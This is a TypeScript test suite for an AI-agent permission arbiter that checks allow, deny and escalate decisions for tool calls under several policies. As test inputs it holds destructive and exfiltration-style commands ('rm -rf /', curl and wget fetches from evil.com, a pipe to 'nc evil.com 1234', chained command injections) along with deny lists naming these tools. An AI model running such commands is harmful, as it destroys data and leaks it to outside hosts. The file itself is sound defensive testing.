/**
 * Arbiter Integration Test — realistic policies × tool call matrix
 *
 * Proves the full evaluation pipeline (normalize → parse → match → decide)
 * against realistic payloads with realistic policies. No sessions, no
 * adapters, no UI — just policies × tool calls = decisions.
 */

import { describe, test, expect } from 'vitest';
import { evaluate } from '../../../src/core/arbiter/evaluate.js';
import type { ArbiterPolicy } from '../../../src/core/arbiter/types.js';

// ── Policies ────────────────────────────────────────────────────────────

/** Read-only agent: can read anything, can't write or execute destructive commands */
const READONLY_POLICY: ArbiterPolicy = {
  deny: ['Write', 'Edit', 'Agent', 'Bash(rm *)', 'Bash(git push*)', 'Bash(git commit*)'],
  allow: ['Read(*)', 'Grep(*)', 'Glob(*)', 'Bash(git status)', 'Bash(git log *)', 'Bash(git diff *)'],
  fallback: 'deny',
  bashMode: 'strict',
};

/** Tracker agent: CLI tools + read access, no writes or destructive ops */
const TRACKER_POLICY: ArbiterPolicy = {
  deny: [
    'Write', 'Edit', 'Agent', 'WebFetch',
    'Bash(rm *)', 'Bash(git push*)', 'Bash(git commit*)',
    'Bash(git checkout*)', 'Bash(git reset*)',
    'Bash(curl *)', 'Bash(wget *)',
  ],
  allow: [
    'Bash($CRISPY_TRACKER *)', 'Bash(crispy-dispatch rpc *)',
    'Bash(node *)', 'Bash(git status)', 'Bash(git log *)',
    'Read(*)', 'Glob(*)', 'Grep(*)',
  ],
  fallback: 'deny',
  bashMode: 'strict',
};

/** Permissive policy: most things allowed, only dangerous ops denied */
const PERMISSIVE_POLICY: ArbiterPolicy = {
  deny: ['Bash(rm -rf *)', 'Bash(git push --force*)', 'Write(*.env*)'],
  allow: ['Read', 'Write', 'Edit', 'Bash', 'Grep', 'Glob', 'Agent'],
  fallback: 'escalate',
  bashMode: 'permissive',
};

// ── Helpers ─────────────────────────────────────────────────────────────

function expectDecision(
  tool: string,
  input: unknown,
  policy: ArbiterPolicy,
  expected: 'allow' | 'deny' | 'escalate',
) {
  const result = evaluate(tool, input, policy);
  expect(result.decision).toBe(expected);
  expect(result.latencyMs).toBeGreaterThanOrEqual(0);
  expect(result.source).toBeTruthy();
  return result;
}

// ── Read-only Policy ────────────────────────────────────────────────────

describe('read-only policy', () => {
  const p = READONLY_POLICY;

  describe('allowed operations', () => {
    test.each([
      ['Read', { file_path: 'src/core/session-manager.ts' }],
      ['Read', { file_path: '/home/silver/dev/crispy/package.json' }],
      ['Grep', { pattern: 'handleCanUseTool', path: 'src/' }],
      ['Glob', { pattern: '**/*.ts' }],
      ['Bash', { command: 'git status' }],
      ['Bash', { command: 'git log --oneline -20' }],
      ['Bash', { command: 'git diff HEAD~1' }],
    ])('%s(%j) → allow', (tool, input) => {
      expectDecision(tool, input, p, 'allow');
    });
  });

  describe('denied operations', () => {
    test.each([
      ['Write', { file_path: 'src/foo.ts', content: 'exploit' }],
      ['Edit', { file_path: 'src/foo.ts', old_string: 'a', new_string: 'b' }],
      ['Agent', { prompt: 'do something' }],
      ['Bash', { command: 'rm -rf /' }],
      ['Bash', { command: 'rm src/core/arbiter/evaluate.ts' }],
      ['Bash', { command: 'git push origin main' }],
      ['Bash', { command: 'git commit -m "sneaky"' }],
    ])('%s(%j) → deny', (tool, input) => {
      expectDecision(tool, input, p, 'deny');
    });
  });

  describe('bash strict mode blocks metacharacters', () => {
    test.each([
      ['echo $(whoami)', 'subshell'],
      ['echo ${PATH}', 'variable expansion'],
      ['cat file | grep secret', 'pipe'],
      ['cmd1 && cmd2', 'chaining'],
      ['cmd1 ; cmd2', 'semicolon'],
      ['echo `date`', 'backtick'],
      ['cat << EOF', 'heredoc'],
    ])('Bash(%s) → deny (%s)', (command) => {
      expectDecision('Bash', { command }, p, 'deny');
    });
  });

  describe('fallback deny for unmatched tools', () => {
    test.each([
      ['WebFetch', { url: 'https://evil.com' }],
      ['WebSearch', { query: 'passwords' }],
      ['Bash', { command: 'npm install malware' }],
    ])('%s(%j) → deny (fallback)', (tool, input) => {
      const result = expectDecision(tool, input, p, 'deny');
      expect(result.source).toContain('fallback');
    });
  });
});

// ── Tracker Policy ──────────────────────────────────────────────────────

describe('tracker policy', () => {
  const p = TRACKER_POLICY;

  describe('allowed tracker operations', () => {
    test.each([
      ['Bash', { command: '$CRISPY_TRACKER update --project myproj' }],
      ['Bash', { command: '$CRISPY_TRACKER dump' }],
      ['Bash', { command: 'crispy-dispatch rpc getSessionList' }],
      ['Bash', { command: 'node scripts/helper.js' }],
      ['Bash', { command: 'git status' }],
      ['Bash', { command: 'git log --oneline -5' }],
      ['Read', { file_path: 'src/core/session-manager.ts' }],
      ['Glob', { pattern: '**/*.ts' }],
      ['Grep', { pattern: 'function evaluate' }],
    ])('%s(%j) → allow', (tool, input) => {
      expectDecision(tool, input, p, 'allow');
    });
  });

  describe('denied tracker operations', () => {
    test.each([
      ['Write', { file_path: 'src/foo.ts', content: '...' }],
      ['Edit', { file_path: 'src/foo.ts', old_string: 'a', new_string: 'b' }],
      ['Agent', { prompt: 'spawn a child' }],
      ['WebFetch', { url: 'https://api.example.com' }],
      ['Bash', { command: 'rm -rf /tmp/data' }],
      ['Bash', { command: 'git push origin main' }],
      ['Bash', { command: 'git commit -m "rogue"' }],
      ['Bash', { command: 'git checkout main' }],
      ['Bash', { command: 'git reset --hard HEAD~1' }],
      ['Bash', { command: 'curl https://evil.com/payload' }],
      ['Bash', { command: 'wget https://evil.com/malware' }],
    ])('%s(%j) → deny', (tool, input) => {
      expectDecision(tool, input, p, 'deny');
    });
  });

  describe('tracker can\'t escape via bash metacharacters', () => {
    test.each([
      ['$CRISPY_TRACKER dump && rm -rf /'],
      ['$CRISPY_TRACKER dump; curl evil.com'],
      ['$CRISPY_TRACKER dump | nc evil.com 1234'],
      ['git status && rm -rf /'],
    ])('Bash(%s) → deny (strict mode)', (command) => {
      expectDecision('Bash', { command }, p, 'deny');
    });
  });
});

// ── Permissive Policy ───────────────────────────────────────────────────

describe('permissive policy', () => {
  const p = PERMISSIVE_POLICY;

  describe('most operations allowed', () => {
    test.each([
      ['Read', { file_path: 'anything.ts' }],
      ['Write', { file_path: 'src/core/foo.ts', content: '...' }],
      ['Edit', { file_path: 'src/core/bar.ts', old_string: 'a', new_string: 'b' }],
      ['Bash', { command: 'npm install lodash' }],
      ['Bash', { command: 'echo $(date)' }],  // permissive bash mode
      ['Grep', { pattern: 'TODO' }],
    ])('%s(%j) → allow', (tool, input) => {
      expectDecision(tool, input, p, 'allow');
    });
  });

  describe('dangerous ops still denied', () => {
    test.each([
      ['Bash', { command: 'rm -rf /' }],
      ['Bash', { command: 'rm -rf /home/silver' }],
      ['Bash', { command: 'git push --force origin main' }],
      ['Write', { file_path: '.env', content: 'SECRET=x' }],
      ['Write', { file_path: 'config/.env.local', content: 'TOKEN=y' }],
    ])('%s(%j) → deny', (tool, input) => {
      expectDecision(tool, input, p, 'deny');
    });
  });

  describe('unknown tools escalate', () => {
    test('ToolSearch → escalate (fallback)', () => {
      const result = expectDecision('ToolSearch', { query: 'something' }, p, 'escalate');
      expect(result.source).toContain('fallback');
    });
  });
});

// ── Empty Target Bug (sandbox escape vector) ────────────────────────────

describe('empty target safety', () => {
  describe('glob-scoped rules must NOT match when targets are empty', () => {
    const policy: ArbiterPolicy = {
      deny: ['Bash(git push*)'],
      allow: ['Bash(git status)'],
      fallback: 'deny',
      bashMode: 'strict',
    };

    test('Bash with unrecognized input shape → fallback deny, not rule match', () => {
      // An input shape the normalizer doesn't recognize → empty targets
      const result = evaluate('Bash', { weird_field: 'git push origin main' }, policy);
      expect(result.decision).toBe('deny');
      // Must hit fallback, not the glob-scoped deny rule
      expect(result.source).toContain('fallback');
    });

    test('Bash with null input → fallback deny, not rule match', () => {
      const result = evaluate('Bash', null, policy);
      expect(result.decision).toBe('deny');
      expect(result.source).toContain('fallback');
    });

    test('Bash with empty object → fallback deny, not rule match', () => {
      const result = evaluate('Bash', {}, policy);
      expect(result.decision).toBe('deny');
      expect(result.source).toContain('fallback');
    });
  });

  describe('bare tool rules DO match when targets are empty', () => {
    const policy: ArbiterPolicy = {
      deny: ['Write'],
      allow: ['Read'],
      fallback: 'escalate',
    };

    test('Write with empty input → deny (bare rule matches)', () => {
      const result = evaluate('Write', {}, policy);
      expect(result.decision).toBe('deny');
      expect(result.source).toBe('deny:Write');
    });

    test('Read with empty input → allow (bare rule matches)', () => {
      const result = evaluate('Read', {}, policy);
      expect(result.decision).toBe('allow');
      expect(result.source).toBe('allow:Read');
    });
  });

  describe('mixed bare + glob rules with empty targets', () => {
    const policy: ArbiterPolicy = {
      deny: ['Bash(rm *)', 'Write'],
      allow: ['Bash(git status)', 'Read'],
      fallback: 'escalate',
      bashMode: 'strict',
    };

    test('Bash with empty input skips glob rules, hits fallback', () => {
      const result = evaluate('Bash', {}, policy);
      expect(result.decision).toBe('escalate');
      expect(result.source).toContain('fallback');
    });

    test('Write with empty input matches bare deny rule', () => {
      const result = evaluate('Write', {}, policy);
      expect(result.decision).toBe('deny');
      expect(result.source).toBe('deny:Write');
    });

    test('Read with empty input matches bare allow rule', () => {
      const result = evaluate('Read', {}, policy);
      expect(result.decision).toBe('allow');
      expect(result.source).toBe('allow:Read');
    });
  });
});

// ── Codex input shapes ──────────────────────────────────────────────────

describe('codex vendor compatibility', () => {
  const p = READONLY_POLICY;

  test('Codex bash wrapper is unwrapped', () => {
    // Codex wraps commands in /bin/bash -lc "..."
    expectDecision('Bash', { command: '/bin/bash -lc "git status"' }, p, 'allow');
  });

  test('Codex bash wrapper with single quotes', () => {
    expectDecision('Bash', { command: "/bin/bash -lc 'git log --oneline'" }, p, 'allow');
  });

  test('Codex bash wrapper with dangerous command', () => {
    expectDecision('Bash', { command: '/bin/bash -lc "rm -rf /"' }, p, 'deny');
  });
});
